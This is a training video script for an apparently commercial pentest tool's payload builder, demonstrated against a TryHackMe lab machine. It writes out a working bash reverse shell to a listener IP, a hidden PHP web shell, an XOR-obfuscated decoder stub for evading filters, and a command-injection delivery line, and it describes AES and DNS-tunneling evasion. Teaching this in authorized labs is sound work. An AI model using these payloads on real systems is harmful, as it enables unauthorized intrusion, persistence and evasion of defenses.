# VIDEO 56: Runecraft Payload Builder
### Custom Payload Generation, Encoding & Delivery Mechanisms
**Suggested length:** 14–18 minutes
**License Tier:** Enterprise
**Certification Relevance:** OSCP: Web Application Attacks (payload crafting) | CEH: System Hacking (trojans, payloads, covert channels)

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 10 title card "Advanced Features and Workflows" — Runecraft logo (a glowing rune sigil) fading in]**

> "Welcome back to Section 10. In the previous video, Guided Mode walked us through an entire engagement methodology (see Video 55: Guided Mode). One of the steps was 'Prepare Payload' — and for that demonstration we used a basic PHP reverse shell. Today we unlock the full power of Runecraft — Huginn's custom payload builder. Runecraft generates payloads tailored to specific services, applies obfuscation and encoding to bypass defenses, and supports delivery across every protocol Huginn can enumerate."

**[Screen: Slide showing Runecraft capabilities — four columns: "Payload Types" (reverse shell, bind shell, web shell, staged), "Services" (RPC, SMB, HTTP, FTP, SSH, RDP, DNS, SNMP), "Obfuscation" (XOR, Base64, AES, RC4, protocol encapsulation), "Delivery" (file upload, command execution, memory injection, DNS tunneling)]**

> "Runecraft covers three dimensions of payload generation. First — what type of payload: reverse shells that call back to you, bind shells that listen for your connection, web shells for persistent web access, and staged payloads that download heavier components after initial execution. Second — which service to deliver through: it auto-detects services from your scan results and builds service-specific payloads. Third — how to avoid detection: XOR encoding, Base64 wrapping, AES encryption, protocol encapsulation, and domain fronting techniques."

**[Screen: Important disclaimer banner — red border — "⚠️ RESPONSIBLE USE NOTICE: Runecraft is for authorized penetration testing ONLY. Never deploy payloads against systems without written authorization. Unauthorized access is a criminal offense."]**

> "Before we go any further — Runecraft is an Enterprise tier feature designed exclusively for authorized penetration testing. Every payload we generate today goes against a TryHackMe lab machine — an isolated environment specifically built for this purpose. Never use payload generation tools against systems you don't have explicit written authorization to test. Unauthorized computer access is a serious criminal offense in virtually every jurisdiction. This applies to security professionals, students, and hobbyists equally. If you don't have a signed scope document, you don't have authorization."

---

## SECTION 1: Accessing Runecraft (1:45 – 3:30)

**[Screen: Huginn exploitation page — clicking the "Runecraft" tab in the exploitation interface]**

> "Runecraft lives in the exploitation section of Huginn. Navigate to the Exploit phase in the attack chain toolbar, then click the 'Runecraft' tab. If you're on a Free or Professional license, you'll see Runecraft listed but locked with an Enterprise badge. For today's demo, we have an Enterprise license active."

**[Screen: Runecraft main interface — showing the wizard layout with three panels: "Service Selection" (left), "Payload Configuration" (center), "Output Preview" (right)]**

> "The Runecraft interface is a three-panel wizard. On the left, Service Selection shows all services discovered from your most recent scan. In the center, Payload Configuration lets you choose payload type, encoding, and delivery options. On the right, Output Preview shows the generated payload in real-time as you configure it. Everything updates live — change a setting and the preview refreshes immediately."

**[Screen: Service Selection panel populated with services from a scan of the THM "Intro to Shells" machine — HTTP (80), SSH (22), and a custom service listed]**

> "I've already run a scan against our THM 'Intro to Shells' room. Runecraft auto-detected the available services: HTTP on port 80 and SSH on port 22. These were pulled directly from our scan results — no manual entry needed. Runecraft's service integration reads from the scan database, which is why running reconnaissance first makes the payload builder so much more effective (see Video 6: Port Scanning for discovery techniques)."

```bash
# Runecraft service auto-detection from scan results:
┌─────────────────────────────────────────────────────────┐
│ Discovered Services (from last scan)                     │
├──────────────┬──────────┬──────────────────────────────┤
│ Service      │ Port     │ Payload Options              │
├──────────────┼──────────┼──────────────────────────────┤
│ HTTP/Apache  │ 80/tcp   │ Web Shell, PHP Shell, Script │
│ SSH/OpenSSH  │ 22/tcp   │ Command Exec, Key Injection  │
└──────────────┴──────────┴──────────────────────────────┘
```

---

## SECTION 2: Generating a Reverse Shell (3:30 – 6:00)

**[Screen: Payload Configuration panel — selecting "Reverse Shell" from payload type dropdown, with format options: Python, PHP, Bash, PowerShell, Perl]**

> "Let's start with the most common payload type — a reverse shell. Select 'Reverse Shell' from the payload type dropdown and Runecraft shows format options. For our Linux target, we'll want Bash or Python. The format selection adapts based on the target's detected operating system and available interpreters. Since our scan found Apache with PHP, PHP is also offered as a format."

**[Screen: Listener configuration fields — "Listener IP" (pre-filled with VPN IP), "Listener Port" (default 4444), "Shell Type" (bash, sh, python)]**

> "Configure the listener — your attack machine's IP and the port you'll catch the shell on. Runecraft pre-fills your VPN IP if it detects an active tunnel connection. Port 4444 is the default, but in a real engagement you might use 443 or 80 to blend with normal traffic. Set the shell type to 'bash' for a full interactive shell."

```bash
# Runecraft → Reverse Shell Configuration:
Payload Type: Reverse Shell
Format: Bash
Listener IP: 10.6.42.85 (auto-detected from tun0)
Listener Port: 4444
Shell: /bin/bash
Stability: Spawn PTY (upgrade to interactive)
```

**[Screen: Output Preview panel showing the generated bash reverse shell payload with syntax highlighting]**

> "The preview panel shows our payload. It's a standard bash reverse shell — redirecting stdin, stdout, and stderr through a TCP connection back to our listener. But notice the 'Stability' option — 'Spawn PTY' adds a Python one-liner after the initial connection that upgrades our dumb shell to a full interactive TTY. This means arrow keys, tab completion, and Ctrl+C work properly from the start."

```bash
# Generated payload (Bash reverse shell with PTY upgrade):
bash -i >& /dev/tcp/10.6.42.85/4444 0>&1

# With PTY stability wrapper:
python3 -c 'import pty;pty.spawn("/bin/bash")' || \
python -c 'import pty;pty.spawn("/bin/bash")'
```

**[Screen: Clicking "Generate" button — payload saved to clipboard and to /tmp/huginn_payloads/ with a success notification]**

> "Click 'Generate' and the payload copies to your clipboard and saves to disk. Runecraft also generates a matching listener command — in this case a netcat listener on port 4444. Let's deploy this payload against our target."

**[Screen: Split view — left terminal running listener, right terminal showing payload execution on target through a web vulnerability]**

> "I've started my listener on the left. On the right, I'm exploiting a command injection vulnerability in the THM room to inject our reverse shell payload. The connection comes back immediately — we have a shell as www-data with full interactive PTY. That took thirty seconds from generation to execution."

```bash
# Listener (left terminal):
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.42.85] from (UNKNOWN) [10.10.211.73] 42718
www-data@intro2shells:/var/www/html$ whoami
www-data
www-data@intro2shells:/var/www/html$ 
```

---

## SECTION 3: Service-Specific Payloads (6:00 – 8:30)

**[Screen: Returning to Runecraft — selecting "HTTP" service from the service panel, payload type changing to show service-specific options: "Web Shell", "PHP Reverse Shell", "JSP Shell", "ASPX Shell"]**

> "Reverse shells are universal, but Runecraft's real power is service-specific payload generation. Select HTTP from the service panel and the payload options change to web-focused variants. Web shells provide persistent access through the web server — you can revisit them anytime without re-exploiting. Let's generate a PHP web shell since our target runs Apache with PHP."

**[Screen: Web Shell configuration — showing "Command execution" mode with password protection option and file manager toggle]**

> "The web shell configuration offers a command execution interface with optional password protection. Always password-protect your web shells — even in a lab. In a real engagement, an unprotected web shell is a backdoor that anyone could discover and use. Set a strong password and Runecraft bakes authentication into the shell."

```bash
# Runecraft → HTTP Service → Web Shell Configuration:
Service: HTTP (Apache/PHP)
Payload Type: PHP Web Shell
Mode: Command Execution + File Browser
Password: HuginnShell2024!
Filename: .system-health.php (dot-prefix for hiding in directory listings)
```

**[Screen: Generated web shell preview — PHP code with authentication check, command execution, and file manager capabilities]**

> "The generated shell includes an auth check — POST the password to authenticate before any command runs. It also includes a file browser for navigating the filesystem through the web interface and a file upload/download capability. This is a complete post-exploitation toolkit deployed as a single PHP file. The dot-prefix filename helps it blend into the web directory."

**[Screen: Runecraft showing the "Delivery Method" options for the HTTP payload — "Upload via vulnerability", "Upload via FTP", "Deploy via SSH", "Manual copy"]**

> "Runecraft suggests delivery methods based on your available access. Since we already have a shell from our reverse shell, 'Deploy via SSH' or our existing shell are the fastest options. Select 'Deploy via existing session' and Runecraft uses your active shell to write the web shell to the web root. One click deployment."

```bash
# Deploy web shell through existing session:
www-data@intro2shells:/var/www/html$ echo '<?php
if($_POST["p"]!=="HuginnShell2024!"){die("404");}
system($_POST["cmd"]);
?>' > /var/www/html/.system-health.php

# Verify deployment:
$ curl -X POST http://10.10.211.73/.system-health.php \
    -d "p=HuginnShell2024!&cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## SECTION 4: Obfuscation and Encoding (8:30 – 11:00)

**[Screen: Runecraft obfuscation panel — showing encoding options: "XOR (key-based)", "Base64 (standard)", "AES-256 (encrypted)", "RC4 (stream cipher)", "Protocol Encapsulation", "Domain Fronting"]**

> "In a real engagement, raw payloads get caught by antivirus, IDS, and WAF systems. Runecraft's obfuscation engine applies multiple layers of encoding to evade detection. Let's walk through the options — from simple encoding to advanced evasion."

**[Screen: Selecting "XOR" encoding — key field appears, preview showing XOR-encoded payload with a decoder stub prepended]**

> "XOR encoding is the simplest — it applies a byte-level XOR operation with a key you specify. The generated payload includes a decoder stub that reverses the XOR at runtime. This bypasses simple signature-based detection because the payload bytes change with every different key. But modern AV can detect XOR patterns, so it's just the first layer."

```bash
# Runecraft → Obfuscation → XOR Encoding (key: 0xAA)
Original: bash -i >& /dev/tcp/10.6.42.85/4444 0>&1
Encoded: \x98\xc9\x8d\xcc\xe4\xca\xc5\xe4...  (XOR 0xAA)

# Runtime decoder stub:
python3 -c "
import os
e=b'\\x98\\xc9\\x8d\\xcc\\xe4\\xca\\xc5\\xe4...'
os.system(''.join(chr(b^0xAA) for b in e))
"
```

**[Screen: Selecting "AES-256" — showing key generation, initialization vector, and the encrypted payload with decryption stub]**

> "AES-256 encryption is the strongest option. Runecraft generates a random key and IV, encrypts the entire payload, and produces a decryption stub that reconstructs and executes the original at runtime. Even sophisticated EDR products struggle to analyze encrypted payloads because the actual malicious code only exists in memory after decryption — never on disk in plaintext."

```bash
# Runecraft → Obfuscation → AES-256 Encryption
Key: [auto-generated 32-byte random key]
IV:  [auto-generated 16-byte random IV]
Mode: CBC

# Output: Self-decrypting payload
# The AES key is embedded in the decoder stub
# Payload only exists in cleartext in memory at runtime
```

**[Screen: "Protocol Encapsulation" option — showing the payload wrapped inside DNS query format, HTTP headers, or ICMP packets]**

> "Protocol encapsulation wraps your payload inside legitimate-looking protocol data. A reverse shell encoded as DNS TXT record queries looks like normal DNS traffic to a firewall. HTTP encapsulation makes it look like web browsing. ICMP encapsulation hides data in ping packets. These techniques are what advanced red teams use to exfiltrate data through networks with strict egress filtering."

**[Screen: Responsible disclosure reminder banner — "These obfuscation techniques are demonstrated for educational purposes in isolated lab environments. In authorized engagements, document all evasion techniques used in your final report."]**

> "Important reminder — in an authorized engagement, you must document every evasion technique you use. Your report should explain what obfuscation was applied, why it was necessary, and what detection gaps it reveals. The client needs to know their defenses were bypassed and how to close those gaps. Obfuscation without documentation defeats the purpose of the assessment."

---

## SECTION 5: Multi-Service Payload Integration (11:00 – 13:00)

**[Screen: Runecraft "Universal Builder" mode — showing all discovered services with checkboxes and a "Generate All" button]**

> "Runecraft's Universal Builder mode generates payloads for every discovered service simultaneously. When you run a comprehensive scan and find RPC, SMB, HTTP, SSH, and DNS all open on a target, the Universal Builder creates service-specific payloads for each one. This gives you multiple attack vectors prepared in advance — if one delivery method fails, you immediately have alternatives."

**[Screen: Universal Builder output — table showing generated payloads for each service with delivery method and execution type]**

> "Here's the output for a multi-service target. RPC gets a memory injection payload delivered via RPC call. SMB gets a binary uploaded through share access and executed as a service. HTTP gets our PHP web shell. SSH gets a bash command payload for direct execution. Each payload is tailored to the protocol's capabilities and the target's specific service version."

```bash
# Runecraft → Universal Payload Builder Results:
┌──────────┬─────────────────┬──────────────────────┬───────────────────┐
│ Service  │ Payload Type    │ Delivery Method       │ Execution Method  │
├──────────┼─────────────────┼──────────────────────┼───────────────────┤
│ RPC      │ Reverse Shell   │ RPC Call              │ Memory Injection  │
│ SMB      │ Staged Payload  │ SMB File Upload       │ Service Creation  │
│ HTTP     │ Web Shell       │ HTTP Upload Form      │ Script Execution  │
│ SSH      │ Reverse Shell   │ Command Execution     │ Direct Execution  │
│ DNS      │ Covert Channel  │ DNS Tunneling         │ Exfiltration      │
└──────────┴─────────────────┴──────────────────────┴───────────────────┘
[*] 5 payloads generated | 3 obfuscation variants each | 15 total options
```

**[Screen: Runecraft integration with scan results — showing how previously discovered vulnerabilities map to specific payload recommendations]**

> "Runecraft also integrates with vulnerability scan results. If Huginn's scanner found a file upload vulnerability, Runecraft pre-selects HTTP web shell delivery. If it found writable SMB shares, it suggests SMB-based deployment. This intelligence-driven approach means you're not guessing at delivery methods — you're using confirmed attack surface."

---

## SECTION 6: Deployment and Verification (13:00 – 15:00)

**[Screen: Runecraft deployment workflow — "Payload Ready → Deploy → Verify Execution → Confirm Callback" with status indicators]**

> "Generating a payload is only half the job — you need to deploy and verify it works. Runecraft includes a deployment workflow that tracks each step. Let's deploy our obfuscated reverse shell against the THM target using the command injection vector we identified earlier."

**[Screen: Deployment step 1 — starting the listener with the matching configuration from payload generation]**

> "Step one — Runecraft starts the listener for you. It knows the IP and port from generation and opens an integrated listener pane. No need to remember the parameters or open a separate terminal."

```bash
# Runecraft → Deploy → Start Listener
[*] Starting listener: nc -lvnp 4444
[*] Waiting for callback from 10.10.211.73...
```

**[Screen: Deployment step 2 — payload delivered through the web vulnerability, connection received]**

> "Step two — deliver the payload. For our demo, we inject the XOR-obfuscated Python one-liner through the command injection point. The obfuscated version is longer but it evades the basic input filtering on the target. Connection received — Runecraft confirms the callback and marks deployment successful."

```bash
# Delivery via command injection:
; python3 -c "import os;e=b'...';os.system(''.join(chr(b^0xAA) for b in e))"

# Runecraft verification:
[+] Callback received from 10.10.211.73:48291
[+] Shell type: /bin/bash (interactive PTY)
[+] User context: www-data
[+] Payload verification: SUCCESS
[*] Session established — payload deployment confirmed
```

**[Screen: Runecraft logging the deployment — showing engagement notes auto-generated: payload type, obfuscation method, delivery vector, timestamp]**

> "Runecraft logs everything automatically — the payload type, obfuscation applied, delivery vector used, and the timestamp. These notes feed directly into your engagement report. When you generate the final report, the payload details appear in the methodology section, documenting exactly how access was achieved. This is critical for professional assessments."

---

## SECTION 7: Certification Tips and Ethical Reminders (15:00 – 16:30)

**[Screen: OSCP tip — "OSCP restricts automated exploitation — understand manual payload crafting. Runecraft teaches you the components; the exam tests you on building them yourself."]**

> "For OSCP — the exam restricts automated exploitation tools on certain machines. Runecraft helps you understand the components of a payload — the shell code, the encoding, the delivery mechanism — but in the exam you'll need to build these manually or use msfvenom with specific restrictions. Practice with Runecraft to understand what each piece does, then replicate the concepts manually."

**[Screen: CEH tip — "CEH covers trojans, backdoors, and covert channels extensively. Runecraft demonstrates all three categories in a controlled lab setting."]**

> "For CEH — the exam tests heavily on trojans, backdoors, and covert channels. Runecraft demonstrates all three: a web shell is a backdoor, an obfuscated reverse shell is essentially a trojan, and DNS tunneling is a covert channel. Understand the taxonomy and you'll recognize these concepts on the exam."

**[Screen: Responsible disclosure reminder — large text: "ALWAYS: 1) Written authorization before testing. 2) Document all payloads deployed. 3) Clean up all artifacts after engagement. 4) Report all access vectors to the client. 5) Securely destroy generated payloads post-engagement."]**

> "Final ethical reminder for this video. Five rules for responsible payload use: First, always have written authorization before generating or deploying any payload. Second, document every payload you deploy — type, location, and purpose. Third, clean up all artifacts after the engagement — remove web shells, kill persistent connections, delete uploaded files. Fourth, report every access vector to the client so they can remediate. Fifth, securely destroy all generated payloads after the engagement concludes. These aren't suggestions — they're professional obligations."

**[Screen: Practice recommendation — "Deploy payloads against THM 'Intro to Shells', 'What the Shell', and 'Overpass 2' to practice different payload types and delivery methods"]**

> "Practice targets: THM 'Intro to Shells' for basic reverse and bind shells, 'What the Shell' for stabilization techniques, and 'Overpass 2' for seeing how attackers use backdoors. Practice generating, deploying, and cleaning up payloads in these isolated environments."

---

## OUTRO (16:30 – end)

**[Screen: Summary slide — Runecraft: Service Detection → Payload Generation → Obfuscation → Delivery → Verification | Enterprise Tier | Next: Video 57 — Hash Cracking]**

> "That's Runecraft — Huginn's Enterprise-tier payload builder. We covered reverse shell generation with PTY stabilization, service-specific payloads for HTTP and SSH, obfuscation techniques from XOR through AES encryption, the Universal Builder for multi-service targets, and the full deployment and verification workflow. Remember — every payload technique we demonstrated today was in an authorized lab environment, and every deployment was documented. In the next video, we shift from exploitation to credential attacks with Huginn's hash cracking tools — dictionary attacks, rule-based cracking, mask attacks, and GPU acceleration for cracking hashes extracted during post-exploitation. See you in Video 57."
